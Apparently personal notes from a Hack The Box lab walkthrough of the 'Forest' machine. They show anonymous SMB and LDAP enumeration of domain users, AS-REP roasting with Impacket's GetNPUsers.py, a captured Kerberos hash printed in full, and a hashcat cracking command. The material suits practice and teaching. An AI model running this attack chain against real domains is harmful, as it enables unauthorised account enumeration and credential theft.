Well, it looks like it only has MSRPC and LDAP.

So, time for this site.

https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap

Looks like `rpcclient -U "" -N 10.10.10.161` is successful.

So is this:

    ┌─[vagrant@parrot]─[~]
    └──╼ $crackmapexec smb 10.10.10.161
    SMB         10.10.10.161    445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)


Looks like we have some users:

    ┌─[vagrant@parrot]─[~]
    └──╼ $crackmapexec smb 10.10.10.161 --users
    SMB         10.10.10.161    445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
    SMB         10.10.10.161    445    FOREST           [*] Trying to dump local users with SAMRPC protocol
    SMB         10.10.10.161    445    FOREST           [+] Enumerated domain user(s)
    SMB         10.10.10.161    445    FOREST           htb.local\Administrator                  Built-in account for administering the computer/domain
    SMB         10.10.10.161    445    FOREST           htb.local\Guest                          Built-in account for guest access to the computer/domain
    SMB         10.10.10.161    445    FOREST           htb.local\krbtgt                         Key Distribution Center Service Account
    SMB         10.10.10.161    445    FOREST           htb.local\DefaultAccount                 A user account managed by the system.
    SMB         10.10.10.161    445    FOREST           htb.local\$331000-VK4ADACQNUCA           
    SMB         10.10.10.161    445    FOREST           htb.local\SM_2c8eef0a09b545acb           
    SMB         10.10.10.161    445    FOREST           htb.local\SM_ca8c2ed5bdab4dc9b           
    SMB         10.10.10.161    445    FOREST           htb.local\SM_75a538d3025e4db9a           
    SMB         10.10.10.161    445    FOREST           htb.local\SM_681f53d4942840e18           
    SMB         10.10.10.161    445    FOREST           htb.local\SM_1b41c9286325456bb           
    SMB         10.10.10.161    445    FOREST           htb.local\SM_9b69f1b9d2cc45549           
    SMB         10.10.10.161    445    FOREST           htb.local\SM_7c96b981967141ebb           
    SMB         10.10.10.161    445    FOREST           htb.local\SM_c75ee099d0a64c91b           
    SMB         10.10.10.161    445    FOREST           htb.local\SM_1ffab36a2f5f479cb           
    SMB         10.10.10.161    445    FOREST           htb.local\HealthMailboxc3d7722           
    SMB         10.10.10.161    445    FOREST           htb.local\HealthMailboxfc9daad           
    SMB         10.10.10.161    445    FOREST           htb.local\HealthMailboxc0a90c9           
    SMB         10.10.10.161    445    FOREST           htb.local\HealthMailbox670628e           
    SMB         10.10.10.161    445    FOREST           htb.local\HealthMailbox968e74d           
    SMB         10.10.10.161    445    FOREST           htb.local\HealthMailbox6ded678           
    SMB         10.10.10.161    445    FOREST           htb.local\HealthMailbox83d6781           
    SMB         10.10.10.161    445    FOREST           htb.local\HealthMailboxfd87238           
    SMB         10.10.10.161    445    FOREST           htb.local\HealthMailboxb01ac64           
    SMB         10.10.10.161    445    FOREST           htb.local\HealthMailbox7108a4e           
    SMB         10.10.10.161    445    FOREST           htb.local\HealthMailbox0659cc1           
    SMB         10.10.10.161    445    FOREST           htb.local\sebastien                      
    SMB         10.10.10.161    445    FOREST           htb.local\lucinda                        
    SMB         10.10.10.161    445    FOREST           htb.local\svc-alfresco                   
    SMB         10.10.10.161    445    FOREST           htb.local\andy                           
    SMB         10.10.10.161    445    FOREST           htb.local\mark                           
    SMB         10.10.10.161    445    FOREST           htb.local\santi                          


We can also try to list shared folders:

    smbclient --no-pass -L 10.10.10.161
    (nothing)

Okay, according to guided mode, LDAP allows anonymous authentication. 

    ldapsearch -x -H ldap://10.10.10.161 -b "CN=Users,DC=htb,DC=local"

I'm too stupid to use the CLI, so let's just use jxplorer :)

https://sourceforge.net/projects/jxplorer/files/jxplorer/version%203.3.1.2/jxplorer-3.3.1.2-linux-installer.run/download

Ok. Seems a bit useless. I cheated more, so we're supposed to use Impacet's `GetNPUsers.py`.

According to the cheaty hint, we're looking for users that have Kerberos pre-auth disabled, and this attack is called "AS-REP-Roasting".

    GetNPUsers.py -no-pass -usersfile users.txt -format hashcat -outputfile ASREProastables-hashcat.txt htb.local/ 


    ┌─[vagrant@parrot]─[~/Git/hackthebox/boxes/Forest]
    └──╼ $    GetNPUsers.py -no-pass -usersfile users.txt htb.local/
    Impacket v0.10.1.dev1+20230518.215801.5882b018 - Copyright 2022 Fortra

    [-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
    [-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
    [-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
    [-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
    [-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set
    [-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
    $krb5asrep$23$svc-alfresco@HTB.LOCAL:b45e930b4c25204fe122147dc17b2aeb$dbce67644cfa76ce9a94b37d3742adcdd804a4750efec47bcfbf3fb3eece83670e770b9e0a02d4ca03e34d0e2ff6a877ad1d60b942a3416073bcbacee06d179e25c8070bc09fa6c443d61024d765fc2de9695cabfd9d4af625f8ebe51b78ea0b02c1ab2dc5f202601888c9b5d65f0ca152e4efb3ecd98a3e0f66b0dcf0d8ec9a4abb611eb38180baa1b1f5027c631a389683a7658d3f9f50cbe11453ce8734adaec28aab55ed38fa1f6bac7f78d8e5fc283fe150f363607056ec24e312143265604d84922a9ea138f6673a587c399a81c4892b524038038d0e636b5112ed46035c1cb07a1ea8
    [-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set
    [-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
    [-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set

So! Now we know that the user `svc-alfresco` DOES HAVE `UF_DONT_REQUIRE_PREAUTH` set.

Also, their kerberos hash (If that's what it is) is:

    b45e930b4c25204fe122147dc17b2aeb$dbce67644cfa76ce9a94b37d3742adcdd804a4750efec47bcfbf3fb3eece83670e770b9e0a02d4ca03e34d0e2ff6a877ad1d60b942a3416073bcbacee06d179e25c8070bc09fa6c443d61024d765fc2de9695cabfd9d4af625f8ebe51b78ea0b02c1ab2dc5f202601888c9b5d65f0ca152e4efb3ecd98a3e0f66b0dcf0d8ec9a4abb611eb38180baa1b1f5027c631a389683a7658d3f9f50cbe11453ce8734adaec28aab55ed38fa1f6bac7f78d8e5fc283fe150f363607056ec24e312143265604d84922a9ea138f6673a587c399a81c4892b524038038d0e636b5112ed46035c1cb07a1ea8

Trying again, with this command instead.

    GetNPUsers.py -no-pass -usersfile users.txt -format hashcat -outputfile ASREProastables-hashcat.txt htb.local/ 

Time to hashcat :)

    hashcat -m18200 ASREProastables-hashcat.txt -a 3 /usr/share/wordlists/rockyou.txt